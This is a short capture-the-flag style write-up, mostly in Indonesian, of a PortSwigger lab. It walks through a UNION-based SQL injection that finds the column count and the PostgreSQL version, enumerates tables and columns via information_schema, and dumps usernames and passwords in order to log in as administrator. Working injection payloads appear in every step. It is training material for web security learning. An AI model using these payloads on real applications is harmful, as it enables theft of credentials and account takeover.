Sumber Soal :
Portswigger Lab SQL injection attack, listing the database contents on non-Oracle databases
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. To solve the lab, log in as the administrator user. 

1. Tentukan jumlah kolom `' order by 1--`
   <img width="1381" height="612" alt="image" src="https://github.com/user-attachments/assets/fa3a9436-d7d5-477e-8263-8fe44c0d336f" /> <br />
   Ketika mencoba kolom ke 3, muncul internal server error yang berarti hanya terdapat 2 kolom <br />
   <img width="1257" height="783" alt="image" src="https://github.com/user-attachments/assets/8e246761-a3a6-4c13-8855-04077d6d9e57" />

2. Tentukan tipe data kolom `' UNION select 'a', 'a'--`
   <img width="1232" height="728" alt="image" src="https://github.com/user-attachments/assets/d5c98aa3-4386-47cc-b3ef-d9966f96dbe8" /> <br />
   Kedua kolom menerima tipe data teks

3. Tentukan versi database `' UNION SELECT version(), NULL--` query tersebut berhasil menandakan database merupakan PostgreSQL
   <img width="1565" height="867" alt="image" src="https://github.com/user-attachments/assets/67ec6c94-11e8-43cd-a9f4-9be2acb893bd" />

4. Output list tabel names dari database `' UNION SELECT table_name, NULL FROM information_schema.tables--`
   <img width="1197" height="609" alt="image" src="https://github.com/user-attachments/assets/2e98b12d-4bb6-461a-9c2e-b1f080197258" /> <br />
   users_sdhlch

5. Output kolom nama pada tabel `' UNION SELECT column_name, NULL FROM information_schema. columns WHERE table_name = 'users_sdhlch'--`
   <img width="1490" height="799" alt="image" src="https://github.com/user-attachments/assets/0848fd66-2b96-481b-990a-dce844f5d787" /> <br />
   username_krtnri password_qqehom

6. Output Username dan Password `' UNION select username_krtnri, password_qqehom from users_sdhlch--`
   <img width="1355" height="697" alt="image" src="https://github.com/user-attachments/assets/26f5963f-909d-4607-85a8-f8d97f7f2110" />
   Kredensial admin berhasil didapat

7. Login sebagai admin
   <img width="1386" height="872" alt="image" src="https://github.com/user-attachments/assets/6b7c9c61-a4f6-4ebd-a6a5-5164cda12bec" />


   




